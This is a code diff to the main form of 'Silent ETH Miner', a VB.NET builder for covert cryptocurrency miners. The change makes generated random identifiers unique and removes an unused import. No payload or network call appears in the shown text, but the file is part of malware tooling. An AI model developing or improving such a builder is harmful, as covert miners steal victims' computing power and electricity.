@@ -1,13 +1,14 @@
 ﻿Imports System.IO
 Imports System.Security.Cryptography
 Imports System.Text
-Imports System.Web
 
 Public Class Form1
     Public rand As New Random()
     Public advancedParams As String = " --response-timeout=300 --farm-retries=30 "
     Public watchdogdata As Byte() = New Byte() {}
     Public FA As New Advanced
+
+    Public RandomiCache As New List(Of String)
 
     'Silent ETH Miner by Unam Sanctam https://github.com/UnamSanctam/SilentETHMiner, based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
 
@@ -18,6 +19,8 @@ Public Class Form1
         CheckForIllegalCrossThreadCalls = False
         Codedom.F = Me
         FA.F = Me
+
+        RandomiCache.Add("SilentXMRMiner")
 
         FA.txtAdvParam.Text = advancedParams
     End Sub
@@ -230,13 +233,19 @@ Public Class Form1
     End Function
 
     Public Function Randomi(ByVal length As Integer) As String
-        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
-        Dim sb As New Text.StringBuilder()
-        For i As Integer = 1 To length
-            Dim idx As Integer = rand.Next(0, Chr.Length)
-            sb.Append(Chr.Substring(idx, 1))
-        Next
-        Return sb.ToString
+        While True
+            Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
+            Dim sb As New Text.StringBuilder()
+            For i As Integer = 1 To length
+                Dim idx As Integer = rand.Next(0, Chr.Length)
+                sb.Append(Chr.Substring(idx, 1))
+            Next
+            If Not RandomiCache.Contains(sb.ToString()) Then
+                RandomiCache.Add(sb.ToString())
+                Return sb.ToString
+            End If
+        End While
+        Return ""
     End Function
 
     Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
@@ -424,5 +433,4 @@ Public Class Form1
     Private Sub MephButton1_Click(sender As Object, e As EventArgs) Handles MephButton1.Click
         FA.Show()
     End Sub
-
 End Class
